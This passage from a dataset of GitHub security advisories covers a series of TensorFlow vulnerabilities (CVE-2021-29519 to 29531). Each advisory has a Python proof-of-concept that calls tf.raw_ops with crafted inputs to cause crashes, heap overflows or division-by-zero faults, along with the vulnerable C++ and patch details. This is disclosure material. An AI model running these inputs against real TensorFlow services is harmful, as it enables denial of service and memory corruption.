Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
204,20741,tensorflow,GHSA-772j-h9xw-ffp5,CVE-2021-29519,https://github.com/advisories/GHSA-772j-h9xw-ffp5,low,2021-05-21 14:21:08 UTC,CHECK-fail in SparseCross due to type confusion,"### Impact
The API of `tf.raw_ops.SparseCross` allows combinations which would result in a `CHECK`-failure and denial of service:

```python
import tensorflow as tf

hashed_output = False
num_buckets = 1949315406
hash_key = 1869835877
out_type = tf.string 
internal_type = tf.string

indices_1 = tf.constant([0, 6], shape=[1, 2], dtype=tf.int64)
indices_2 = tf.constant([0, 0], shape=[1, 2], dtype=tf.int64)
indices = [indices_1, indices_2]

values_1 = tf.constant([0], dtype=tf.int64)
values_2 = tf.constant([72], dtype=tf.int64)
values = [values_1, values_2]

batch_size = 4
shape_1 = tf.constant([4, 122], dtype=tf.int64)
shape_2 = tf.constant([4, 188], dtype=tf.int64)
shapes = [shape_1, shape_2]

dense_1 = tf.constant([188, 127, 336, 0], shape=[4, 1], dtype=tf.int64)
dense_2 = tf.constant([341, 470, 470, 470], shape=[4, 1], dtype=tf.int64)
dense_3 = tf.constant([188, 188, 341, 922], shape=[4, 1], dtype=tf.int64)
denses = [dense_1, dense_2, dense_3]

tf.raw_ops.SparseCross(indices=indices, values=values, shapes=shapes, dense_inputs=denses, hashed_output=hashed_output,
                       num_buckets=num_buckets, hash_key=hash_key, out_type=out_type, internal_type=internal_type)
```

The above code will result in a `CHECK` fail in [`tensor.cc`](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/framework/tensor.cc#L670-L675):

```cc
void Tensor::CheckTypeAndIsAligned(DataType expected_dtype) const {
  CHECK_EQ(dtype(), expected_dtype)
      << "" "" << DataTypeString(expected_dtype) << "" expected, got ""
      << DataTypeString(dtype());
  ...
}
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d/tensorflow/core/kernels/sparse_cross_op.cc#L114-L116) is tricked to consider a tensor of type `tstring` which in fact contains integral elements:

```cc
  if (DT_STRING == values_.dtype())
      return Fingerprint64(values_.vec<tstring>().data()[start + n]);
  return values_.vec<int64>().data()[start + n];
```

Fixing the type confusion by preventing mixing `DT_STRING` and `DT_INT64` types solves this issue.

### Patches
We have patched the issue in GitHub commit [b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025](https://github.com/tensorflow/tensorflow/commit/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
205,20741,tensorflow,GHSA-wcv5-qrj6-9pfm,CVE-2021-29520,https://github.com/advisories/GHSA-wcv5-qrj6-9pfm,low,2021-05-21 14:21:12 UTC,Heap buffer overflow in `Conv3DBackprop*`,"### Impact
Missing validation between arguments to `tf.raw_ops.Conv3DBackprop*` operations can result in heap buffer overflows:

```python
import tensorflow as tf

input_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)
filter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)
out_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)

tf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 89, 29, 89, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```
```python
import tensorflow as tf

input_values = [-10.0] * (7 * 7 * 7 * 7 * 7)
input_values[0] = 429.6491056791816
input_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)
filter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)
out_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)
  
tf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/4814fafb0ca6b5ab58a09411523b2193fed23fed/tensorflow/core/kernels/conv_grad_shape_utils.cc#L94-L153) assumes that the `input`, `filter_sizes` and `out_backprop` tensors have the same shape, as they are accessed in parallel.

### Patches
We have patched the issue in GitHub commit [8f37b52e1320d8d72a9529b2468277791a261197](https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our securityguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
206,20741,tensorflow,GHSA-hr84-fqvp-48mm,CVE-2021-29521,https://github.com/advisories/GHSA-hr84-fqvp-48mm,low,2021-05-21 14:21:16 UTC,Segfault in SparseCountSparseOutput,"### Impact
Specifying a negative dense shape in `tf.raw_ops.SparseCountSparseOutput` results in a segmentation fault being thrown out from the standard library as `std::vector` invariants are broken.

```python
import tensorflow as tf

indices = tf.constant([], shape=[0, 0], dtype=tf.int64)
values = tf.constant([], shape=[0, 0], dtype=tf.int64)
dense_shape = tf.constant([-100, -100, -100], shape=[3], dtype=tf.int64)
weights = tf.constant([], shape=[0, 0], dtype=tf.int64)

tf.raw_ops.SparseCountSparseOutput(indices=indices, values=values, dense_shape=dense_shape, weights=weights, minlength=79, maxlength=96, binary_output=False)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/8f7b60ee8c0206a2c99802e3a4d1bb55d2bc0624/tensorflow/core/kernels/count_ops.cc#L199-L213) assumes the first element of the dense shape is always positive and uses it to initialize a `BatchedMap<T>` (i.e., [`std::vector<absl::flat_hash_map<int64,T>>`](https://github.com/tensorflow/tensorflow/blob/8f7b60ee8c0206a2c99802e3a4d1bb55d2bc0624/tensorflow/core/kernels/count_ops.cc#L27)) data structure.

```cc
  bool is_1d = shape.NumElements() == 1;
  int num_batches = is_1d ? 1 : shape.flat<int64>()(0);
  ...
  auto per_batch_counts = BatchedMap<W>(num_batches); 
```

If the `shape` tensor has more than one element, `num_batches` is the first value in `shape`.
                       
Ensuring that the `dense_shape` argument is a valid tensor shape (that is, all elements are non-negative) solves this issue.

### Patches
We have patched the issue in GitHub commit [c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5](https://github.com/tensorflow/tensorflow/commit/c57c0b9f3a4f8684f3489dd9a9ec627ad8b599f5).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2 and TensorFlow 2.3.3.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
207,20741,tensorflow,GHSA-c968-pq7h-7fxv,CVE-2021-29522,https://github.com/advisories/GHSA-c968-pq7h-7fxv,low,2021-05-21 14:21:39 UTC,Division by 0 in `Conv3DBackprop*`,"### Impact
The `tf.raw_ops.Conv3DBackprop*` operations fail to validate that the input tensors are not empty. In turn, this would result in a division by 0:

```python
import tensorflow as tf

input_sizes = tf.constant([0, 0, 0, 0, 0], shape=[5], dtype=tf.int32)
filter_tensor = tf.constant([], shape=[0, 0, 0, 1, 0], dtype=tf.float32)
out_backprop = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)
                            
tf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```
```python
import tensorflow as tf

input_sizes = tf.constant([1], shape=[1, 1, 1, 1, 1], dtype=tf.float32)
filter_tensor = tf.constant([0, 0, 0, 1, 0], shape=[5], dtype=tf.int32)
out_backprop = tf.constant([], shape=[1, 1, 1, 1, 0], dtype=tf.float32)

tf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a91bb59769f19146d5a0c20060244378e878f140/tensorflow/core/kernels/conv_grad_ops_3d.cc#L430-L450) does not check that the divisor used in computing the shard size is not zero:

```cc
  const int64 size_A = output_image_size * dims.out_depth;
  const int64 size_B = filter_total_size * dims.out_depth;
  const int64 size_C = output_image_size * filter_total_size;
  const int64 work_unit_size = size_A + size_B + size_C;
  ...
  const size_t shard_size =
      use_parallel_contraction
        ? 1
        : (target_working_set_size + work_unit_size - 1) / work_unit_size;
```

Thus, if attacker controls the input sizes, they can trigger a denial of service via a division by zero error.

### Patches
We have patched the issue in GitHub commit [311403edbc9816df80274bd1ea8b3c0c0f22c3fa](https://github.com/tensorflow/tensorflow/commit/311403edbc9816df80274bd1ea8b3c0c0f22c3fa).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
208,20741,tensorflow,GHSA-2cpx-427x-q2c6,CVE-2021-29523,https://github.com/advisories/GHSA-2cpx-427x-q2c6,low,2021-05-21 14:21:43 UTC,CHECK-fail in AddManySparseToTensorsMap,"### Impact
An attacker can trigger a denial of service via a `CHECK`-fail in  `tf.raw_ops.AddManySparseToTensorsMap`:

```python
import tensorflow as tf
import numpy as np

sparse_indices = tf.constant(530, shape=[1, 1], dtype=tf.int64)
sparse_values = tf.ones([1], dtype=tf.int64)

shape = tf.Variable(tf.ones([55], dtype=tf.int64))
shape[:8].assign(np.array([855, 901, 429, 892, 892, 852, 93, 96], dtype=np.int64))

tf.raw_ops.AddManySparseToTensorsMap(sparse_indices=sparse_indices,
                    sparse_values=sparse_values,
                    sparse_shape=shape)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/kernels/sparse_tensors_map_ops.cc#L257) takes the values specified in `sparse_shape` as dimensions for the output shape: 

```cc
    TensorShape tensor_input_shape(input_shape->vec<int64>());
```

The [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.
  
```cc
template <class Shape>
TensorShapeBase<Shape>::TensorShapeBase(gtl::ArraySlice<int64> dim_sizes) {
  set_tag(REP16);
  set_data_type(DT_INVALID);
  TF_CHECK_OK(InitDims(dim_sizes));
}
```

In our scenario, this occurs when adding a dimension from the argument results in overflow:

```cc
template <class Shape>
Status TensorShapeBase<Shape>::InitDims(gtl::ArraySlice<int64> dim_sizes) {
  ...
  Status status = Status::OK();
  for (int64 s : dim_sizes) {
    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));
    if (!status.ok()) {
      return status;
    }
  }
}

template <class Shape>
Status TensorShapeBase<Shape>::AddDimWithStatus(int64 size) {
  ...
  int64 new_num_elements;
  if (kIsPartial && (num_elements() < 0 || size < 0)) {
    new_num_elements = -1;
  } else {
    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);
    if (TF_PREDICT_FALSE(new_num_elements < 0)) {
        return errors::Internal(""Encountered overflow when multiplying "",
                                num_elements(), "" with "", size,
                                "", result: "", new_num_elements);
      }
  }
  ...
}
```

This is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.

### Patches
We have patched the issue in GitHub commit [69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c](https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
209,20741,tensorflow,GHSA-r4pj-74mg-8868,CVE-2021-29524,https://github.com/advisories/GHSA-r4pj-74mg-8868,low,2021-05-21 14:21:47 UTC,Division by 0 in `Conv2DBackpropFilter`,"### Impact
An attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropFilter`:

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 1, 0], dtype=tf.float32)
filter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)
out_backprop = tf.constant([], shape=[0, 0, 1, 1], dtype=tf.float32)

tf.raw_ops.Conv2DBackpropFilter(input=input_tensor, filter_sizes=filter_sizes,
                                out_backprop=out_backprop,
                                strides=[1, 66, 18, 1], use_cudnn_on_gpu=True,
                                padding='SAME', explicit_paddings=[],
                                data_format='NHWC', dilations=[1, 1, 1, 1])
```                 
                    
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/496c2630e51c1a478f095b084329acedb253db6b/tensorflow/core/kernels/conv_grad_shape_utils.cc#L130) does a modulus operation where the divisor is controlled by the caller:

```cc 
  if (dims->in_depth % filter_shape.dim_size(num_dims - 2)) { ... }
```
    
### Patches
We have patched the issue in GitHub commit [fca9874a9b42a2134f907d2fb46ab774a831404a](https://github.com/tensorflow/tensorflow/commit/fca9874a9b42a2134f907d2fb46ab774a831404a).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
210,20741,tensorflow,GHSA-xm2v-8rrw-w9pm,CVE-2021-29525,https://github.com/advisories/GHSA-xm2v-8rrw-w9pm,low,2021-05-21 14:21:51 UTC,Division by 0 in `Conv2DBackpropInput`,"### Impact
An attacker can trigger a division by 0 in `tf.raw_ops.Conv2DBackpropInput`:

```python
import tensorflow as tf

input_tensor = tf.constant([52, 1, 1, 5], shape=[4], dtype=tf.int32)
filter_tensor = tf.constant([], shape=[0, 1, 5, 0], dtype=tf.float32)
out_backprop = tf.constant([], shape=[52, 1, 1, 0], dtype=tf.float32)

tf.raw_ops.Conv2DBackpropInput(input_sizes=input_tensor, filter=filter_tensor,
                               out_backprop=out_backprop, strides=[1, 1, 1, 1],
                               use_cudnn_on_gpu=True, padding='SAME',
                               explicit_paddings=[], data_format='NHWC',
                               dilations=[1, 1, 1, 1])
```                 
                    
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/b40060c9f697b044e3107917c797ba052f4506ab/tensorflow/core/kernels/conv_grad_input_ops.h#L625-L655) does a division by a quantity that is controlled by the caller:

```cc 
  const size_t size_A = output_image_size * dims.out_depth; 
  const size_t size_B = filter_total_size * dims.out_depth;
  const size_t size_C = output_image_size * filter_total_size;
  const size_t work_unit_size = size_A + size_B + size_C;
  ...
  const size_t shard_size =
      use_parallel_contraction ? 1 :
      (target_working_set_size + work_unit_size - 1) / work_unit_size;
```

### Patches
We have patched the issue in GitHub commit [2be2cdf3a123e231b16f766aa0e27d56b4606535](https://github.com/tensorflow/tensorflow/commit/2be2cdf3a123e231b16f766aa0e27d56b4606535).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
211,20741,tensorflow,GHSA-4vf2-4xcg-65cx,CVE-2021-29526,https://github.com/advisories/GHSA-4vf2-4xcg-65cx,low,2021-05-21 14:21:55 UTC,Division by 0 in `Conv2D`,"### Impact
An attacker can trigger a division by 0 in `tf.raw_ops.Conv2D`:

```python
import tensorflow as tf

input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)

strides = [1, 1, 1, 1]
padding = ""SAME""
                               
tf.raw_ops.Conv2D(input=input, filter=filter, strides=strides, padding=padding)
```                            
                               
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/988087bd83f144af14087fe4fecee2d250d93737/tensorflow/core/kernels/conv_ops.cc#L261-L263) does a division by a quantity that is controlled by the caller:
```cc
  const int64 patch_depth = filter.dim_size(2);
  if (in_depth % patch_depth != 0) { ... }
```
  
### Patches
We have patched the issue in GitHub commit [b12aa1d44352de21d1a6faaf04172d8c2508b42b](https://github.com/tensorflow/tensorflow/commit/b12aa1d44352de21d1a6faaf04172d8c2508b42b).
  
The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution 
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
212,20741,tensorflow,GHSA-x4g7-fvjj-prg8,CVE-2021-29527,https://github.com/advisories/GHSA-x4g7-fvjj-prg8,low,2021-05-21 14:21:59 UTC,Division by 0 in `QuantizedConv2D`,"### Impact
An attacker can trigger a division by 0 in `tf.raw_ops.QuantizedConv2D`:

```python
import tensorflow as tf

input = tf.zeros([1, 1, 1, 1], dtype=tf.quint8)
filter = tf.constant([], shape=[1, 0, 1, 1], dtype=tf.quint8)
min_input = tf.constant(0.0)
max_input = tf.constant(0.0001)
min_filter = tf.constant(0.0)
max_filter = tf.constant(0.0001)
strides = [1, 1, 1, 1]
padding = ""SAME""               
                               

tf.raw_ops.QuantizedConv2D(input=input, filter=filter, min_input=min_input, max_input=max_input, min_filter=min_filter, max_filter=max_filter, strides=strides, padding=padding)
```
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/00e9a4d67d76703fa1aee33dac582acf317e0e81/tensorflow/core/kernels/quantized_conv_ops.cc#L257-L259) does a division by a quantity that is controlled by the caller: 

```cc
const int filter_value_count = filter_width * filter_height * input_depth;
const int64 patches_per_chunk = kMaxChunkSize / (filter_value_count * sizeof(T1));
```
  
### Patches
We have patched the issue in GitHub commit [cfa91be9863a91d5105a3b4941096044ab32036b](https://github.com/tensorflow/tensorflow/commit/cfa91be9863a91d5105a3b4941096044ab32036b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
213,20741,tensorflow,GHSA-6f84-42vf-ppwp,CVE-2021-29528,https://github.com/advisories/GHSA-6f84-42vf-ppwp,low,2021-05-21 14:22:02 UTC,Division by 0 in `QuantizedMul`,"### Impact
An attacker can trigger a division by 0 in `tf.raw_ops.QuantizedMul`:

```python
import tensorflow as tf

x = tf.zeros([4, 1], dtype=tf.quint8)
y = tf.constant([], dtype=tf.quint8)
min_x = tf.constant(0.0)
max_x = tf.constant(0.0010000000474974513)
min_y = tf.constant(0.0)
max_y = tf.constant(0.0010000000474974513)

tf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)
```                            

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55900e961ed4a23b438392024912154a2c2f5e85/tensorflow/core/kernels/quantized_mul_op.cc#L188-L198) does a division by a quantity that is controlled by the caller:

```cc
template <class T, class Toutput>
void VectorTensorMultiply(const T* vector_data, int32 vector_offset,
                          int64 vector_num_elements, const T* tensor_data,
                          int32 tensor_offset, int64 tensor_num_elements,
                          Toutput* output) {
  for (int i = 0; i < tensor_num_elements; ++i) {
    const int64 vector_i = i % vector_num_elements;
    ...
  }
}
```

### Patches
We have patched the issue in GitHub commit [a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6](https://github.com/tensorflow/tensorflow/commit/a1b11d2fdd1e51bfe18bb1ede804f60abfa92da6).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
214,20741,tensorflow,GHSA-jfp7-4j67-8r3q,CVE-2021-29529,https://github.com/advisories/GHSA-jfp7-4j67-8r3q,low,2021-05-21 14:22:05 UTC,Heap buffer overflow caused by rounding,"### Impact
An attacker can trigger a heap buffer overflow in `tf.raw_ops.QuantizedResizeBilinear` by manipulating input values so that float rounding results in off-by-one error in accessing image elements:

```python
import tensorflow as tf

l = [256, 328, 361, 17, 361, 361, 361, 361, 361, 361, 361, 361, 361, 361, 384]
images = tf.constant(l, shape=[1, 1, 15, 1], dtype=tf.qint32)
size = tf.constant([12, 6], shape=[2], dtype=tf.int32)
min = tf.constant(80.22522735595703)
max = tf.constant(80.39215850830078)

tf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max,
                                   align_corners=True, half_pixel_centers=True)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/44b7f486c0143f68b56c34e2d01e146ee445134a/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L62-L66) computes two integers (representing the upper and lower bounds for interpolation) by ceiling and flooring a floating point value:

```cc
const float in_f = std::floor(in);
interpolation->lower[i] = std::max(static_cast<int64>(in_f), static_cast<int64>(0));
interpolation->upper[i] = std::min(static_cast<int64>(std::ceil(in)), in_size - 1);
```
  
For some values of `in`, `interpolation->upper[i]` might be smaller than `interpolation->lower[i]`. This is an issue if `interpolation->upper[i]` is capped at `in_size-1` as it means that `interpolation->lower[i]` points outside of the image. Then, [in the interpolation code](https://github.com/tensorflow/tensorflow/blob/44b7f486c0143f68b56c34e2d01e146ee445134a/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L245-L264), this would result in heap buffer overflow:

```cc
template <int RESOLUTION, typename T, typename T_SCALE, typename T_CALC>
inline void OutputLerpForChannels(const InterpolationCache<T_SCALE>& xs,
                                  const int64 x, const T_SCALE ys_ilerp,
                                  const int channels, const float min,
                                  const float max, const T* ys_input_lower_ptr,
                                  const T* ys_input_upper_ptr,
                                  T* output_y_ptr) {
  const int64 xs_lower = xs.lower[x];
  ...
  for (int c = 0; c < channels; ++c) {
    const T top_left = ys_input_lower_ptr[xs_lower + c];
    ...
  }
}
```

For the other cases where `interpolation->upper[i]` is smaller than `interpolation->lower[i]`, we can set them to be equal without affecting the output.

### Patches
We have patched the issue in GitHub commit [f851613f8f0fb0c838d160ced13c134f778e3ce7](https://github.com/tensorflow/tensorflow/commit/f851613f8f0fb0c838d160ced13c134f778e3ce7).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
215,20741,tensorflow,GHSA-xcwj-wfcm-m23c,CVE-2021-29530,https://github.com/advisories/GHSA-xcwj-wfcm-m23c,low,2021-05-21 14:22:09 UTC,Invalid validation in `SparseMatrixSparseCholesky`,"### Impact
An attacker can trigger a null pointer dereference by providing an invalid `permutation` to `tf.raw_ops.SparseMatrixSparseCholesky`:

```python
import tensorflow as tf
import numpy as np
from tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops

indices_array = np.array([[0, 0]])
value_array = np.array([-10.0], dtype=np.float32)
dense_shape = [1, 1]
st = tf.SparseTensor(indices_array, value_array, dense_shape)

input = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(
       st.indices, st.values, st.dense_shape)

permutation = tf.constant([], shape=[1, 0], dtype=tf.int32)
 
tf.raw_ops.SparseMatrixSparseCholesky(input=input, permutation=permutation, type=tf.float32)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/kernels/sparse/sparse_cholesky_op.cc#L85-L86) fails to properly validate the input arguments: 
                          
```cc 
void Compute(OpKernelContext* ctx) final {
  ...
  const Tensor& input_permutation_indices = ctx->input(1);
  ...
  ValidateInputs(ctx, *input_matrix, input_permutation_indices, &batch_size, &num_rows);
  ...
}

void ValidateInputs(OpKernelContext* ctx,
    const CSRSparseMatrix& sparse_matrix,
    const Tensor& permutation_indices, int* batch_size,
    int64* num_rows) {
  OP_REQUIRES(ctx, sparse_matrix.dtype() == DataTypeToEnum<T>::value, ...)
  ...
}
```
Although `ValidateInputs` is called and there are checks in the body of this function, the code proceeds to the next line in `ValidateInputs` since [`OP_REQUIRES`](https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/framework/op_requires.h#L41-L48) is a macro that only exits the current function.

```cc
#define OP_REQUIRES(CTX, EXP, STATUS)                     \
  do {                                                    \
    if (!TF_PREDICT_TRUE(EXP)) {                          \
      CheckNotInComputeAsync((CTX), ""OP_REQUIRES_ASYNC""); \
      (CTX)->CtxFailure(__FILE__, __LINE__, (STATUS));    \
      return;                                             \
    }                                                     \
  } while (0)
```

Thus, the first validation condition that fails in `ValidateInputs` will cause an early return from that function. However, the caller will continue execution from the next line. The fix is to either explicitly check `context->status()` or to convert `ValidateInputs` to return a `Status`.

### Patches
We have patched the issue in GitHub commit [e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd](https://github.com/tensorflow/tensorflow/commit/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
216,20741,tensorflow,GHSA-3qxp-qjq7-w4hf,CVE-2021-29531,https://github.com/advisories/GHSA-3qxp-qjq7-w4hf,low,2021-05-21 14:22:13 UTC,CHECK-fail in tf.raw_ops.EncodePng,"### Impact
An attacker can trigger a `CHECK` fail in PNG encoding by providing an empty input tensor as the pixel data:

```python
import tensorflow as tf

image = tf.zeros([0, 0, 3])
image = tf.cast(image, dtype=tf.uint8) 
tf.raw_ops.EncodePng(image=image) 
```

